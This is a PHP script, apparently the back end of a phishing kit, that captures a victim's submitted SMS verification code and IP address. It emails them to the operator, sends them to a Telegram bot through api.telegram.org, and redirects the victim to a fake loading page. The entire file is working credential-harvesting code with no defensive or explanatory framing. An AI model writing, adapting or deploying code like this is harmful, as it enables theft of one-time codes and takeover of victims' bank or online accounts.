<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------------------\n";
$message .= "SMS 2   : ".$_POST['sms2']."\n";
$message .= "----------- Z3CI ------------\n";
$message .= "lp      : $ip\n";
$message .= "H0ST    : $hostname\n";

$send = "";


$subject = "SMS 2 | $ip ]";
$headers = "From: Z3CI";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($MyEmail,$subject,$message);
include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: load2.html?id=4932YR-329TR23R");

?>
